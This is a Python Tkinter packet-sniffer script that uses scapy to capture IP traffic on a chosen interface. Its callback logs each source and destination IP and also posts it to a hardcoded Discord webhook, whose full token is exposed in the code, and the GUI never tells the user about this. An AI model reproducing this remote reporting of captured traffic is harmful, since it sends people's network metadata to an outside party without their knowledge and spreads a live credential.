import tkinter as tk
from tkinter import messagebox, ttk
from scapy.all import sniff, IP
import logging
import threading
from PIL import Image, ImageTk
import requests
import json

# Set up logging
logging.basicConfig(filename='sniffer.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1267041871515881473/9SJFJRw66Zt9iHqn7EtmWT-yTZkXNoFBDFf10bLXDLzsE3FtmUk7r9HI6ZEvBXMOizee'

# Packet capture logic
def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        packet_info = f"Source IP: {src_ip} -> Destination IP: {dst_ip}"
        
        logging.info(packet_info)
        print(packet_info)

        # Send to Discord
        data = {
            "content": packet_info
        }
        response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers={"Content-Type": "application/json"})
        if response.status_code != 204:
            logging.error(f"Failed to send message to Discord: {response.status_code}, {response.text}")

def start_sniffing(interface):
    sniff(iface=interface, prn=packet_callback, store=False)

# GUI setup
class PacketSnifferGUI(tk.Tk):
    def __init__(self, start_sniffing_callback):
        super().__init__()
        self.title("Network Packet Sniffer")
        self.geometry("400x400")
        self.configure(bg='#2E2E2E')

        self.start_sniffing_callback = start_sniffing_callback

        self.create_widgets()

    def create_widgets(self):
        # Set up the background image
        bg_image = Image.open("background.jpg")
        bg_image = bg_image.resize((400, 400), Image.LANCZOS)
        self.bg_image = ImageTk.PhotoImage(bg_image)

        bg_label = tk.Label(self, image=self.bg_image)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        # Add shadow effects
        shadow_frame = tk.Frame(self, bg='#1A1A1A')
        shadow_frame.place(relx=0.5, rely=0.5, anchor='center')

        container = tk.Frame(shadow_frame, bg='#FFFFFF')
        container.pack(padx=10, pady=10)

        self.interface_label = tk.Label(container, text="Network Interface:", bg='#FFFFFF')
        self.interface_label.pack(pady=5)

        self.interface_entry = tk.Entry(container, width=30, bg='#F7F7F7')
        self.interface_entry.pack(pady=5)

        self.start_button = tk.Button(container, text="Start Sniffing", command=self.on_start_click, bg='#4CAF50', fg='#FFFFFF')
        self.start_button.pack(pady=10)

    def on_start_click(self):
        interface = self.interface_entry.get()
        if interface:
            self.start_sniffing_callback(interface)
        else:
            messagebox.showerror("Error", "Please enter a network interface.")

def start_sniffing_thread(interface):
    thread = threading.Thread(target=start_sniffing, args=(interface,))
    thread.daemon = True
    thread.start()

if __name__ == "__main__":
    app = PacketSnifferGUI(start_sniffing_thread)
    app.mainloop()
